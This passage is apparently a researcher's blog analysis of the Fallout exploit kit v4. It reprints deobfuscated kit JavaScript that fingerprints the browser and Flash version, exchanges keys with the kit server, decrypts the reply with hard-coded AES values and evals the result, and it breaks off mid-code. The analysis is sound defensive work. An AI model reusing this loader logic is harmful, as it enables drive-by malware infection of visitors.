<blockquote class="twitter-tweet"><p dir="ltr" lang="en"><a href="https://twitter.com/hashtag/EKFiddle?src=hash&amp;ref_src=twsrc%5Etfw">#EKFiddle</a> [Regex update]: <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a><br />Seems like there is no more use of the PoC on GitHub for CVE-2018-8174.<br />Pushing <a href="https://twitter.com/hashtag/GandCrab?src=hash&amp;ref_src=twsrc%5Etfw">#GandCrab</a> in this particular instance.<a href="https://t.co/U67qZosp1e">https://t.co/U67qZosp1e</a> <a href="https://t.co/buVTakYuhJ">pic.twitter.com/buVTakYuhJ</a></p>&mdash; EKFiddle (@EKFiddle) <a href="https://twitter.com/EKFiddle/status/1116134534989238272?ref_src=twsrc%5Etfw">2019年4月11日</a></blockquote>


<p>We call this a big update v4 (it is still v4). Detailed analysis report has not been written about what kind of update Fallout has done. However, this update is very big. At least for us (Exploit Kit analyst), that made the analysis very cumbersome. Fallout v4 incorporates the following features.</p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Diffie-Hellman key exchange
<span class="p">2.</span> VM detection
<span class="p">3.</span> Process detection
</code></pre></div></div>

<p>Here, we will share detailed analysis results on the updates made by Fallout v4. But unfortunately, we did not understand everything. If you are aware of it, please help us.</p>

<h2 id="traffic-chain">Traffic chain</h2>
<p>First, let’s look at the previous traffic chain. v1~3 was like this.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-eXpYD_rUFwU/W4loVPM1TTI/AAAAAAAAAVI/XuE3p36q7QMAVw95gBYPkKOA-IhsdaoAQCLcBGAs/s1600/0.png" />
<img alt="" src="https://3.bp.blogspot.com/-_qnvJOfIOeE/XEiKt9Zs16I/AAAAAAAAAYI/tspkgYcwxe0YjeGhaTGofsUBpfmhjJzmwCLcBGAs/s1600/0.png" />
<img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<p>In v3, it acquired PoC of CVE-2018-8174 from GitHub, and attacked by rewriting the part of shellcode. So what kind of traffic chain is v4?</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/01.png" /></p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Landing Page
<span class="p">2.</span> JavaScript Code
<span class="p">3.</span> Encoded Code 1
<span class="p">4.</span> Encoded Code 2 (CVE-2018-8174 + SWF Loader)
<span class="p">5.</span> CVE-2018-15982
<span class="p">6.</span> PowerShell Code
<span class="p">7.</span> Malware
</code></pre></div></div>

<p>In this way, an attack is performed by seven traffics. Let’s look at each one in order. (In the following, we will use different traffic data from the above. The detailed reason will be mentioned later, but it is difficult to capture and analyze traffic at the same time)</p>

<h2 id="landing-page--js-code--encoded-data">Landing Page + JS Code + Encoded Data</h2>
<p>In the landing page, JavaScript code is read first.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/04_09_2003/Symposium?Peristele=02_03_1943&amp;LE3r=Aps&amp;ILZhH=Frazzling-Anorexias"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>This includes CryptoJS and BigInteger obfuscated. Excluding the large library parts, there is very little processing.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// key</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">III1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">8b69cbdfc5fe43e69b7920c8ee721fc9</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// iv</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">II1ll11I</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">301ae8205ddcd5897df69e3b0c056c34</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">l11llIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">p4N9IqH/oiAKHkDCR0zXXfrvhwVrVPsFZSNUjkVFXxxBofjpd5JLM1sdAega3oRy</span><span class="dl">"</span><span class="p">,</span> <span class="nx">III1l1</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">II1ll11I</span>
<span class="p">})[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>First, two data (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) will appear. This is a key and an IV for AES encryption. By decrypting the next Base64 character string using these keys and IV, the necessary data (specifically, the URL for acquiring encoded data used in the next step) can be obtained. . When it tries decoding, it becomes like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/02.png" /></p>

<p>Next is the process of checking which browser is being used. Depending on it, Opera, Firefox, IE or Chrome is investigated.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check browser</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">String</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1l1IlI</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">addons</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opera</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">indexOf</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2"> OPR/</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">InstallTrigger</span><span class="dl">"</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">documentMode</span><span class="dl">"</span><span class="p">])</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">runtime</span><span class="dl">"</span><span class="p">])</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Then there is a process to check the version of Adobe Flash Player. This data will be used later.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ShockwaveFlash.ShockwaveFlash</span><span class="dl">'</span><span class="p">).</span><span class="nx">getVariable</span><span class="p">(</span><span class="dl">'</span><span class="s1">$version</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>The process then returns to the landing page. In the landing page, one function is defined and executed. Let’s look at that function.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E =&gt; str_B.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Here, many processes such as <code class="language-plaintext highlighter-rouge">window['Il1IIllIlI1I']['lIIIlI1IlII']['I111l11l']['II1I1I'](16)['lIlIlll11l']()</code> appear. This is defined in CryptoJS and generates a 32 character random hexadecimal string. After generating four random data, use the second, third and fourth of them to generate the fifth data. Here modPow is used. The five data prepared here will be used in the ensuing cryptographic process. We call them str_A, str_B, str_C, str_D, str_E.</p>

<p>The following code is divided into three parts. <code class="language-plaintext highlighter-rouge">Onreadystatechange</code> after the first one has sent a request to the server. The process of generating data to be sent by the second. The third is the process to send. These are the standard XMLHttpRequest POST procedures. First, let’s look at the process of generating transmission data.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A</span>

<span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Five data have been added to the array <code class="language-plaintext highlighter-rouge">l11IlIIlllll</code>. Other than the last one is the random data created earlier. There are 5 random data, but the data other than str_C is send data. The last one is the browser check data generated earlier. It checks whether the browser is Opera, Firefox, IE or Chrome, respectively, and contains true or false and is concatenated with <code class="language-plaintext highlighter-rouge">@@</code>. Such data is prepared for send. It should be noted here that str_C has not been sent to the server.</p>

<p>Next, let’s look at the sending process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span> <span class="nx">l11llIll</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="cm">/* -- snip -- */</span>

<span class="c1">// Send POST</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>

    <span class="c1">// aes_encrypt(data, key, iv)</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>        <span class="c1">// post request data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
        <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>This is also a general request sending process. The URL is a string decoded by AES earlier. The data to be sent is the previously prepared data, but these are encrypted by AES. The key and IV are the same as those used to decode the URL. The previous data to be encrypted looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlII11"</span><span class="p">:</span><span class="s2">"c81e728d9d4c2f636f067f89cc14862c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lll1II"</span><span class="p">:</span><span class="s2">"a87ff679a2f3e71d9181a67b7542122c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"l11IlIl"</span><span class="p">:</span><span class="s2">"3f05415ebff145466040f6a73dca8704"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lI1lIl1Ill"</span><span class="p">:</span><span class="s2">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II1l1IlI"</span><span class="p">:</span><span class="s2">"false@@false@@true@@false"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The data actually sent is encrypted in this way.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TvU4TAyld3MNlDcMtLwxBo+uVXAbIB1jpPO1a9HDv2dZs7HonG67s8heWoMyvnUFqFBdoEhU0STYjHHQxX6DK7x7Z1naG/2TAdm+AR5l6gpYVl4jXB9oOOyfJtZrfJHabQT5Jhlqv1dtvsJ+0G27qhamqtPT16wCpXn2R2WHf8NJu9SvXSSVadW7sT6QDt32Jt0z3oR0VIlpuE/w3snfKDNIjJYhuMz/VGYIL9WNdg0hC26sxB5fJ5fOOuifh2rNk9GgNsNdfVP01Tf77GRDu9puTbgfsgYOnCz0ONOmp05B14kJ1tK8ZI6ciOWLvOYV
</code></pre></div></div>

<p>Let’s look at the process after sending. <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called. Here, two AES decodings are performed. Let’s first look at the first decoding process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>

<span class="kd">var</span> <span class="nx">l1I1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIl11</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIlIl1IIl11</span><span class="p">);</span>
</code></pre></div></div>

<p>POST response data is encrypted with AES. The keys and IV are the same as before, and the hard-coded values (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) are hard-coded in the JavaScript code. Jsonify is performed because the JSON data can be obtained by decoding. The decoded JSON data looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"IlI1l"</span><span class="p">:</span><span class="s2">"9b412e5c651d73fd1e271dd63f6901a0"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"I1111"</span><span class="p">:</span><span class="s2">"r+sZGwxURs48PDt8pilYLNYjKbVrMHSmlgv0jeEE7qd8KN+KbbqRpYBUUrEFfM5VSLfRPthHQmyzFoY7fuCtOQQ9vUiMBC+3</span><span class="se">\/</span><span class="s2">pL…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decode the second data using the first (32-character hexadecimal string) of this data. The first data is called str_F. Also, decoding is done with AES, but the key and IV are different from before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_F</span>

<span class="c1">// key (str_G) =&gt; str_F.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>

<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">Il11lII1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIl1IIl11</span><span class="dl">'</span><span class="p">],</span>          <span class="c1">// enc_data</span>
    <span class="nx">II1ll</span><span class="p">,</span>                          <span class="c1">// str_G</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span> <span class="p">}</span>      <span class="c1">// iv =&gt; str_A</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The values generated by str_F, str_C and str_D are called str_G. Thus, str_C is required to decode the data, but str_C has not been sent to the server. By looking at the traffic data, you can see str_E and str_G created by str_C, but it is impossible to find str_C. Please see Wikipedia for details.</p>
<ul>
  <li><a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie–Hellman key exchange - Wikipedia</a></li>
</ul>

<p>The data thus decoded is executed as JavsScript.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// eval</span>
<span class="nx">II1Il</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll1I1</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Let’s look at the executed code. First, the URL used next is decoded. The key and IV used at this time are hard-coded initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_url, key, iv)</span>
<span class="kd">var</span> <span class="nx">l11l1I1</span> <span class="o">=</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span>
    <span class="dl">"</span><span class="s2">l9kie2x7t4Iq4hRNA3G3Juz+buSrv9OSyATsAvZRjsoWkjatAa3Am6oRnar5jjv2N8XFpvDYQbKswFbyKiGPXM/eRwj5+hz4hg+dTKr5BLk=</span><span class="dl">"</span><span class="p">,</span>
    <span class="nx">III1l1</span><span class="p">,</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nx">II1ll11I</span> <span class="p">}</span>
